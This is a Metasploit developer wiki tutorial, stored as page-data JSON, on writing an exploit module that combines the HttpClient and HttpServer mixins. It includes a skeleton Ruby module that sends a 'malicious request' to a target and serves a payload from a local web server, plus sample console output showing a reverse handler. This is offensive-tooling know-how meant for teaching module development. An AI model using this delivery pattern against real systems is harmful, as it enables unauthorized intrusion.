{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Misc/How-to-write-a-module-using-HttpServer-and-HttpClient","result":{"data":{"markdownRemark":{"id":"6be5dd97-f657-5e00-bf7c-ff369684da41","frontmatter":{"title":"How to write a module using HttpServer and HttpClient","root":null},"html":"<p>Using multiple networking mixins in a Metasploit module is always a tricky thing to do, because most likely you will run into issues like overlapping datastore options, variables, methods, the super call is only meant for one mixin, etc. This is considered as advanced module development, and sometimes can be rather painful to figure out on your own. To improve the Metasploit development experience, we have a few examples to demonstrate common scenarios that require you to use multiple mixins to achieve exploitation. </p>\n<h3 id=\"todays-lesson-send-a-http-request-to-attack-the-target-machine-and-use-a-httpserver-for-payload-delivery\" style=\"position:relative;\"><a href=\"#todays-lesson-send-a-http-request-to-attack-the-target-machine-and-use-a-httpserver-for-payload-delivery\" aria-label=\"todays lesson send a http request to attack the target machine and use a httpserver for payload delivery permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Today's lesson: Send a HTTP request to attack the target machine, and use a HttpServer for payload delivery.</h3>\n<p>Say you want to exploit a web server or web application. You have code execution on the box, but you need to find a way to deliver the final payload (probably an executable), and a HTTP server happens to be your option.</p>\n<p>Here is how you can set it up:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token comment\">##</span>\n<span class=\"token comment\"># This module requires Metasploit: http://metasploit.com/download</span>\n<span class=\"token comment\"># Current source: https://github.com/rapid7/metasploit-framework</span>\n<span class=\"token comment\">##</span>\n\n<span class=\"token keyword\">require</span> <span class=\"token string\">'msf/core'</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">MetasploitModule</span> <span class=\"token operator\">&lt;</span> <span class=\"token constant\">Msf</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Exploit</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Remote</span>\n  <span class=\"token constant\">Rank</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NormalRanking</span>\n\n  <span class=\"token keyword\">include</span> <span class=\"token constant\">Msf</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Exploit</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Remote</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">HttpClient</span>\n  <span class=\"token keyword\">include</span> <span class=\"token constant\">Msf</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Exploit</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Remote</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">HttpServer</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">HTML</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">initialize</span></span><span class=\"token punctuation\">(</span>info<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>update_info<span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Name'</span>           <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"HttpClient and HttpServer Example\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Description'</span>    <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">%q{\n        This demonstrates how to use two mixins (HttpClient and HttpServer) at the same time,\n        but this allows the HttpServer to terminate after a delay.\n      }</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'License'</span>        <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token constant\">MSF_LICENSE</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Author'</span>         <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'sinn3r'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'References'</span>     <span class=\"token operator\">=</span><span class=\"token operator\">></span>\n        <span class=\"token punctuation\">[</span>\n          <span class=\"token punctuation\">[</span><span class=\"token string\">'URL'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'http://metasploit.com'</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Payload'</span>        <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span> <span class=\"token string\">'BadChars'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Platform'</span>       <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Targets'</span>        <span class=\"token operator\">=</span><span class=\"token operator\">></span>\n        <span class=\"token punctuation\">[</span>\n          <span class=\"token punctuation\">[</span> <span class=\"token string\">'Automatic'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Privileged'</span>     <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'DisclosureDate'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"Dec 09 2013\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'DefaultTarget'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n      register_options<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span>\n          <span class=\"token constant\">OptString</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span><span class=\"token string\">'TARGETURI'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'The path to some web application'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n          <span class=\"token constant\">OptInt</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span><span class=\"token string\">'HTTPDELAY'</span><span class=\"token punctuation\">,</span>    <span class=\"token punctuation\">[</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Number of seconds the web server will wait before termination'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">end</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">on_request_uri</span></span><span class=\"token punctuation\">(</span>cli<span class=\"token punctuation\">,</span> req<span class=\"token punctuation\">)</span>\n    print_status<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>peer<span class=\"token delimiter tag\">}</span></span> - Payload request received: <span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>req<span class=\"token punctuation\">.</span>uri<span class=\"token delimiter tag\">}</span></span>\"</span><span class=\"token punctuation\">)</span>\n    send_response<span class=\"token punctuation\">(</span>cli<span class=\"token punctuation\">,</span> <span class=\"token string\">'You get this, I own you'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">end</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">primer</span></span>\n    print_status<span class=\"token punctuation\">(</span><span class=\"token string\">\"Sending a malicious request to <span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>target_uri<span class=\"token punctuation\">.</span>path<span class=\"token delimiter tag\">}</span></span>\"</span><span class=\"token punctuation\">)</span>\n    send_request_cgi<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token string\">'uri'</span><span class=\"token operator\">=</span><span class=\"token operator\">></span>normalize_uri<span class=\"token punctuation\">(</span>target_uri<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">end</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">exploit</span></span>\n    <span class=\"token keyword\">begin</span>\n      <span class=\"token constant\">Timeout</span><span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">(</span>datastore<span class=\"token punctuation\">[</span><span class=\"token string\">'HTTPDELAY'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">super</span> <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">rescue</span> <span class=\"token constant\">Timeout</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Error</span>\n      <span class=\"token comment\"># When the server stops due to our timeout, this is raised</span>\n    <span class=\"token keyword\">end</span>\n  <span class=\"token keyword\">end</span>\n<span class=\"token keyword\">end</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Here's what happens when you run the above example:</p>\n<ol>\n<li>The super call wrapped in the Timeout block will start the web server.</li>\n<li>Before the web server is in the infinite loop state, the primer() method is called, which is where you send your malicious requests to get code execution.</li>\n<li>Your HttpServer serves the final payload upon request.</li>\n<li>After 10 seconds, the module raises a Timeout exception. The web server finally terminates.</li>\n</ol>\n<p>In case you're wondering why the web server must terminate after a period of time, this is because if the module fails to gain code execution on the target machine, obviously it will never ask your web server for the malicious payload, therefore there is no point to keeping it alive forever. Typically it shouldn't take a very long time to get a payload request, either, so we keep the timeout short.</p>\n<p>The output for the above example should look something like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(test) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse handler on 10.0.1.76:4444 \n[*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80\n[*]  Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80\n[*] Server started.\n[*] Sending a malicious request to /\nmsf exploit(test) &gt;\n[*] 10.0.1.76        test - 10.0.1.76:8181 - Payload request received: /SUuv1qjZbCibL80\n[*] Server stopped.\n\nmsf exploit(test) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"related-articles\" style=\"position:relative;\"><a href=\"#related-articles\" aria-label=\"related articles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Related Articles:</h3>\n<ul>\n<li><a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient</a></li>\n<li><a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer</a></li>\n<li><a href=\"https://community.rapid7.com/community/metasploit/blog/2012/12/17/metasploit-hooks\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://community.rapid7.com/community/metasploit/blog/2012/12/17/metasploit-hooks</a></li>\n</ul>"}},"pageContext":{"id":"6be5dd97-f657-5e00-bf7c-ff369684da41"}}}